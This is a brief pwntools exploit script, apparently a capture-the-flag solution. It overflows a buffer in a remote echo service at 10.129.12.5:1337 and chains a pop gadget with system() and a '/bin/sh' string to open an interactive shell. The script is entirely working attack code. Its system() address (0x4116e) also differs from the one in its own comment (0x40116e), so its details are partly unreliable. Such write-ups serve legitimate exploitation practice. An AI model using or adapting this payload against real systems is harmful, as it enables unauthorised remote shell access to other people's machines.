#0x40115f - main from ghidra
#0x40116e - System
#0x401206 - Pop r13, pop, pop ret

from pwn import *
context(terminal=['tmux', 'new-window'])
#p = gdb.debug('./myapp', 'b main')
p = remote('10.129.12.5', 1337) 
context(os='linux', arch='amd64')

# 120 - 8 for bin_sh
junk = ("A" * 112).encode()
bin_sh = "/bin/sh\x00".encode()
system = p64(0x4116e) # procedural linked table
pop_r13 = p64(0x401206) # JMP r13 like rsp
null = p64(0x0)
test = p64(0x401152) # memory address to jump to
#call_main = p64(0x40115f)

# Comment out for remote as for the gdb.debug requires:
p.sendline('\x0A'.encode())
p.recvuntil('What do you want me to echo back?')

# put bin_sh into r13  and pop the next two pop and ret to test
p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)
p.interactive()
